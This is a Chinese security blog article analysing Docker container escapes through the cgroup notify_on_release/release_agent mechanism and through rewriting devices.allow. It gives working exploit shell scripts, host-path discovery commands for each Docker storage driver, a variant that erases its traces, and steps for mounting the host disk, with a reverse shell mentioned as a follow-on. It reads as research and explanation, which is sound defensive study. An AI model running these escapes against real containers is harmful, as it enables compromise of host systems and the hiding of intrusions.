# docker notify_on_release和重写devices.allow逃逸方式分析

阅读量 **296494**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-10-28 16:30:30

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t012a2f3dfb64c4e3a0.png)

## 简介

docker容器逃逸的方式很多，除了利用内核漏洞之外，利用错误的安全配置也是逃逸的常用手段，如在特权容器下挂载根目录或者利用docker.sock创建后门容器等，在cap_sys_admin权限下，也有几种手法可以进行逃逸，本文对notify_on_release和devices.allow两种方式进行分析，在notify_on_release公开exp基础上补充在docker多种存储驱动场景下的利用方式

## notify_on_release逃逸方式原理

###  公开的EXP

    
    
    mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
    echo 1 > /tmp/cgrp/x/notify_on_release
    host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
    echo "$host_path/cmd" > /tmp/cgrp/release_agent
    echo '#!/bin/sh' > /cmd
    echo "ps aux > $host_path/output" >> /cmd
    chmod a+x /cmd
    sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
    

###  notify_on_release与cgroup

既然是notify_on_release的方式，首先了解下notify_on_release机制是什么，了解notify_on_release前就需要先了解cgroup，cgroup的官方定义如下：

>
> cgroups是Linux内核提供的一种机制，这种机制可以根据需求把一系列系统任务及其子任务整合（或分隔）到按资源划分等级的不同组内，从而为系统资源管理提供一个统一的框架。

在Linux中cgroup的实现形式表现为一个文件系统，可以通过mount -t cgroup看到系统cgroup的挂载情况

![](https://p3.ssl.qhimg.com/t01eb578caf7492e909.jpg)

可以看到cgroup提供了很多子系统包括cpu、devices、blkio等

![](https://p2.ssl.qhimg.com/t01a88a821bf1730aad.jpg)

以memory子系统为例看下每个子系统包含哪些文件

![](https://p4.ssl.qhimg.com/t01aaac0041af276943.jpg)

其中memory开头的文件对内存进行控制包括内存使用量，oom之后的行为等等，除此之外主要了解下一下几个和逃逸相关的文件

  * cgroup.procs：罗列所有在该cgroup中的TGID（线程组ID），即线程组中第一个进程的PID。该文件并不保证TGID有序和无重复。写一个TGID到这个文件就意味着把与其相关的线程都加到这个cgroup中
  * tasks:罗列了所有在该cgroup中任务的TID，即所有进程或线程的ID。该文件并不保证任务的TID有序，把一个任务的TID写到这个文件中就意味着把这个任务加入这个cgroup中，如果这个任务所在的任务组与其不在同一个cgroup，那么会在cgroup.procs文件里记录一个该任务所在任务组的TGID值，但是该任务组的其他任务并不受影响。
  * notify_on_release：0或1，表示是否在cgroup中最后一个任务退出时通知运行release agent，默认情况下是0，表示不运行，看下官方对notify_on_release的解释  

> If the notify_on_release flag is enabled (1) in a cgroup, then whenever the
> last task in the cgroup leaves (exits or attaches to some other cgroup) and
> the last child cgroup of that cgroup is removed, then the kernel runs the
> command specified by the contents of the “release_agent” file in that
> hierarchy’s root directory, supplying the pathname (relative to the mount
> point of the cgroup file system) of the abandoned cgroup. This enables
> automatic removal of abandoned cgroups. The default value of
> notify_on_release in the root cgroup at system boot is disabled(0). The
> default value of other cgroups at creation is the current value of their
> parents’ notify_on_release settings. The default value of a cgroup
> hierarchy’s release_agent path is empty.

可以简单理解为提供了以下功能：  
如果notify_on_release的值被设置为1，cgroup下所有task结束的时候（最后一个进程结束或转移到其他cgroup），那么内核就会运行root
cgroup下release_agent文件中的对应路径的文件，这里还提到内核会为要执行的程序提供一个参数，但实际测试中没有发现有参数传递。

    * release_agent：

> release_agent, can be used to register the pathname of a program that may be
> invoked when a cgroup in the hierarchy becomes empty

指明release_agent文件内容应该指定一个可执行文件路径名。这个路径名是宿主机的路径名也就是文件的真实路径，不是在容器中看到的路径，通常用于自动化卸载无用的cgroup。并且整个文件只能存在于root
cgroup，如果在下层创建release_agent文件会提示Permission denied无法创建

## 利用原理

通过对这几个文件的理解，基本可以理清利用原理

1.需要一个可写的cgroup,至于用cgroup的哪个子系统也就是-o参数应该是都可以的，直接把root
cgroup的notify_on_release设置成1显然是不合理的，因为最后一步还需要移除cgroup下的所有进程，所以创建一个子cgroup然后将子cgroup的notify_on_release置为1就不会对原有设置产生影响

2.需要控制一个文件，这个文件有两个特点：

  * 知道这个文件在宿主机路径
  * 在容器中可以修改这个文件内容和执行权限如果能够知道容器在宿主机上真实路径就可以满足这一要求，在容器写任意一个文件然后拼接容器所在宿主机路径即可，exp中通过读mtab的方式获取容器所在的宿主机路径，这个正则是在docker使用overlay方式作为存储驱动时才可以使用，除了overlay方式外还有devicemapper、vfs、zfs、aufs、btrfs，每种存储方式获取容器所在的宿主机路径的方式并不相同，以下针对docker支持的每种不同的存储驱动的宿主机路径给出获取容器所在宿主机路径的方式  

###  device mapper存储驱动获取容器所在宿主机路径

device
mapper场景读取/etc/mtab看到的/dev/mapper/下的路径而非在真实访问用的路径但还是可以通过他构造在宿主机上的路径，devicemapper在宿主机上的目录默认是/var/lib/docker/devicemapper/mnt/[id]/rootfs，通过`sed
-n 's/\/dev\/mapper\/docker\-[0-9]*:[0-9]*\-[0-9]*\-\(.*\) \/\(.*\)/\1/p'
/etc/mtab`可以获取到对应的id值，最终host_path为:

    
        host_path='/var/lib/docker/devicemapper/mnt/'`sed -n 's/\/dev\/mapper\/docker\-[0-9]*:[0-9]*\-[0-9]*\-\(.*\) \/\(.*\)/\1/p' /etc/mtab`'/rootfs'
    

###  aufs存储驱动获取容器所在宿主机路径

aufs场景下在mtab下记录的挂载信息很少，需要在/sys/fs/aufs/si_[id]目录下查看aufs的mount的情况来拼凑容器所在的宿主机路径  
  
那么容器对应在宿主机上的路径为  
`/var/lib/docker/aufs/mnt/a6a473a3a20259ac816466fc42e0903e0cf3333b14e2a05e3b48d459aec14349`  
如果想要实际测试，需要看下哪些发行版默认是支持aufs的，默认centos不支持aufs存储驱动，需要安装下支持aufs的内核，以centos8为例

    
        wget https://yum.spaceduck.org/kernel-ml-aufs/8/x86_64/kernel-ml-aufs-core-5.14.9-1.el8.x86_64.rpm
    wget https://yum.spaceduck.org/kernel-ml-aufs/8/x86_64/kernel-ml-aufs-modules-5.14.9-1.el8.x86_64.rpm
    wget https://yum.spaceduck.org/kernel-ml-aufs/8/x86_64/kernel-ml-aufs-5.14.9-1.el8.x86_64.rpm
    rpm -iv kernel-ml-aufs-core-5.14.9-1.el8.x86_64.rpm 
    rpm -iv kernel-ml-aufs-modules-5.14.9-1.el8.x86_64.rpm 
    rpm -iv kernel-ml-aufs-5.14.9-1.el8.x86_64.rpm
    

重启系统选择AlmaLinux进去再设置daemon.json即可

###  btrfs存储驱动获取容器所在宿主机路径

btrfs场景获取真实路径的方式很简单，读取/etc/mtab  
  
取btrfs的subvol部分加上默认的路径即可，最终路径为  
`/var/lib/docker/btrfs/subvolumes/5a0307fd430e8a74a7bcc9d3d8ffa150084cb896c817c65e375ff63f2830bd5f`  
如果想要实际测试，在虚拟机安装完系统之后对磁盘扩容，创建新的分区如/dev/sda3，然后将磁盘设置为btrfs文件系统挂载到/var/lib/docker下，设置daemon.json文件即可

centos下docker设置btrfs存储驱动的步骤参考：[docker设置btrfs存储驱动](https://github.com/SPuerBRead/ddup/blob/master/Docker%E7%9B%B8%E5%85%B3/docker%E8%AE%BE%E7%BD%AEbtrfs%E5%AD%98%E5%82%A8%E9%A9%B1%E5%8A%A8/docker%E8%AE%BE%E7%BD%AEbtrfs%E5%AD%98%E5%82%A8%E9%A9%B1%E5%8A%A8.md)

###  vfs存储驱动获取容器所在宿主机路径

vfs场景在`/proc/1/mountinfo`或者`/proc/1/task/1/mountinfo`文件中都可以获取到在宿主机上的路径，如下图所示  
  
即在宿主机上的路径为`/var/lib/docker/vfs/dir/22cb9061c2009fdb31ba1fcc5c70ff2546a407e7a63f5cf3c4f489c8c5e6333d`

###  zfs存储驱动获取容器所在宿主机路径

zfs场景通过`cat /etc/mtab`可以获取到如下内容  
  
其中id部分用作构造容器在宿主机的所在路径，容器所在宿主机路径为：`/var/lib/docker/zfs/graph/18497fc84b4b79422657ebe1bc9b283821aee22ee95da3fe54909c6c4a97c5a2`

###  overlayfs存储驱动获取容器所在宿主机路径

overlay与overlay2获取方式相同，读取/etc/mtab的方式即可

    
        host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
    

3.清空子cgroup下的cgroup.procs中的所有进程，触发release_agent执行写入的命令，这里有一个问题，cgroup.procs看起来和tasks貌似区别不大，可以简单理解成cgroup.procs是进程级别的管理，tasks是进程级别的管理，在实际测试中，修改`sh
-c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"`为`sh -c "echo \$\$ >
/tmp/cgrp/x/tasks"`也是同样会触发release_agent的

## 用处不大的tips

除了找到容器在宿主机的真实路径外，也是有其他方式的，只满足上面这两个条件很容易可以想到挂载目录，如果以以下方式启动docker  
`docker run -it --cap-add='SYS_ADMIN' -v /tmp:/tmp/host_tmp centos bash`  
宿主机把自己的/tmp目录挂载到容器的/tmp/host_tmp目录，那么就可以借助/tmp/host_tmp完成利用，首先在进入容器时通过mount查看当前容器有哪些挂载

![](https://p0.ssl.qhimg.com/t01b3382f13e4ec2640.jpg)

可以看到挂载到了/tmp/host_tmp,但是看不到在宿主机上是什么路径

![](https://p5.ssl.qhimg.com/t01a555566b8c3e3723.jpg)

通过`cat /proc/self/mountinfo | grep
/tmp/host_tmp`可以确定宿主机的/tmp以rw方式挂载到了/tmp/host_tmp，修改exp如下：

    
    
    mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
    echo 1 > /tmp/cgrp/x/notify_on_release
    echo "/tmp/cmd" > /tmp/cgrp/release_agent
    echo '#!/bin/sh' > /tmp/host_tmp/cmd
    echo "ps aux > /tmp/output" >> /tmp/host_tmp/cmd
    chmod a+x /tmp/host_tmp/cmd
    sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
    

## 清理痕迹

1.删除创建的子cgroup  
2.取消/tmp下的cgroup挂载  
3.删除/tmp/cgrp/空目录  
4.删除/cmd文件  
5.删除/output文件

    
    
    mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
    echo 1 > /tmp/cgrp/x/notify_on_release
    host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
    echo "$host_path/cmd" > /tmp/cgrp/release_agent
    echo '#!/bin/sh' > /cmd
    echo "$1 > $host_path/output" >> /cmd
    chmod a+x /cmd
    sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
    sleep 2
    cat /output
    rmdir /tmp/cgrp/x && umount /tmp/cgrp/ && rm -rf /output /cmd /tmp/cgrp
    

![](https://p5.ssl.qhimg.com/t01a12ea07e6fd0afb4.jpg)

## 重写devices.allow逃逸方式原理

###  公开的EXP

CDK：[Exploit: rewrite cgroup devices](https://github.com/cdk-team/CDK/wiki/Exploit:-rewrite-cgroup-devices)

###  devices.allow

devices子系统用于配制允许或者阻止cgroup中的task访问某个设备，起到黑白名单的作用，主要包含以下文件

  1. devices.allow：cgroup中的task能够访问的设备列表，格式为type major:minor access 
    * type表示类型,可以为 a(all), c(char), b(block）
    * major:minor代表设备编号，两个标号都可以用 _代替表示所有，比如_ :*代表所有的设备
    * accss表示访问方式，可以为r(read),w(write), m(mknod)的组合
  2. devices.deny：cgroup 中任务不能访问的设备，和上面的格式相同
  3. devices.list：列出 cgroup 中设备的黑名单和白名单

我们在容器中将devices子系统挂载在/tmp/dev/下那么容器本身的配置在以下位置:

  1. 在docker环境下，容器自身的devices.allow路径为：`/tmp/dev/docker/[container_id]/devices.allow`，container id可以通过以下命令获得:`cat /proc/self/cgroup | grep docker | head -1 | sed 's/.*\/docker\/\(.*\)/\1/g'`
  2. 在k8s环境中，`/tmp/dev/kubepods.slice/kubepods-burstable.slice/`目录下包含当前宿主机所有pod目录大致为kubepods-burstable-pod[id].slice，这个目录下包含是pod中每个container的相关配置，可以通过查看所有挂载找到当前容器所在的位置，执行`mount -l | grep kubepods`,类似如下内容： 
    
        cgroup on /sys/fs/cgroup/systemd/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podd48471c8_48de_11eb_9ca9_246e96cd3098.slice/docker-014c16f0839f7274ec5075332576435c254c214cdc21ca0cec361ad6749aef1a.scope type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/usr/lib/systemd/systemd-cgroups-agent,name=systemd)
    

那么容器自身的devices.allow路径为：

    
        /tmp/dev/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podd48471c8_48de_11eb_9ca9_246e96cd3098.slice/docker-014c16f0839f7274ec5075332576435c254c214cdc21ca0cec361ad6749aef1a.scope/devices.allow
    

通过在devices.allow写入a相当于写入a _:_ rwm，允许对所有设备进行read/write/mknod操作

###  利用原理

  1. 创建空目录挂载cgroup devices子系统
  2. 确定当前容器对应的子cgroup位置
  3. 设置其devices.allow文件为a
  4. 获得宿主机的设备major和minor
  5. 通过mknod根据设备major和minor手动创建设备文件
  6. 利用debugfs或直接挂载设备文件访问宿主机文件
  7. 设置宿主机定时任务等方式反弹shell

EXP和解释如下：

    
    
    # 步骤1
    mkdir /tmp/dev && mount -t cgroup -o devices devices /tmp/dev
    
    # 步骤二
    ##  如果是k8s环境
    mount -l | grep kubepods
    # cgroup on /sys/fs/cgroup/systemd/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podd48471c8_48de_11eb_9ca9_246e96cd3098.slice/docker-014c16f0839f7274ec5075332576435c254c214cdc21ca0cec361ad6749aef1a.scope type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/usr/lib/systemd/systemd-cgroups-agent,name=systemd)
    cd /tmp/dev/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podd48471c8_48de_11eb_9ca9_246e96cd3098.slice/docker-014c16f0839f7274ec5075332576435c254c214cdc21ca0cec361ad6749aef1a.scope
    ## 如果是docker环境
    cat /proc/self/cgroup | grep docker | head -1 | sed 's/.*\/docker\/\(.*\)/\1/g'
    # 62b8e246d01e978a2cf671a4e67b49782401bd647ae87ad967553598bce7108c
    cd /tmp/dev/docker/62b8e246d01e978a2cf671a4e67b49782401bd647ae87ad967553598bce7108c
    
    # 步骤三
    echo a > devices.allow && cd /tmp
    
    # 步骤四
    cat /proc/self/mountinfo | grep /etc | awk '{print $3,$8}' | head -1
    # 253:0 xfs
    
    # 步骤五
    mknod host b 253 0
    
    # 步骤六
    ## 步骤四会输出major和minor和文件系统类型，如果是ext2/ext3/ext4文件系统可以用debugfs直接看目录，如果是xfs文件系统debugfs不支持，直接挂载看就可以
    mkdir /tmp/host_dir && mount host /tmp/host_dir
    

![](https://p4.ssl.qhimg.com/t0193bc88dcb9bae7a4.jpg)

## 参考文档

[1] [红蓝对抗中的云原生漏洞挖掘及利用实录](https://security.tencent.com/index.php/blog/msg/183)  
[2] <https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt>  
[3] [cgroups(7) – Linux manual page](https://man7.org/linux/man-pages/man7/cgroups.7.html)  
[4] [PID/TID/TGID参考](https://www.cnblogs.com/wipan/p/9488318.html)  
[5] [Docker存储驱动程序](https://docs.docker.com/storage/storagedriver/)  
[6] [procs 和tasks 的区别](http://linux.laoqinren.net/posts/hierarchy-without-controller-group/#procs-%E5%92%8Ctasks-%E7%9A%84%E5%8C%BA%E5%88%AB)  
[7] [Device Whitelist
Controller](https://www.kernel.org/doc/Documentation/cgroup-v1/devices.txt)  
[8] [Exploit:-rewrite-cgroup-devices](https://github.com/cdk-team/CDK/wiki/Exploit:-rewrite-cgroup-devices))

由于作者水平有限，难免存在不足，如有疏漏，欢迎大家讨论指正

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **flagT** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/256304](/post/id/256304)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Docker](/tag/Docker)
  * [容器逃逸](/tag/容器逃逸)

 **+1** __5赞

 __收藏

![](https://p0.ssl.qhimg.com/t01127509bd2c65f4d2.png) flagT

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

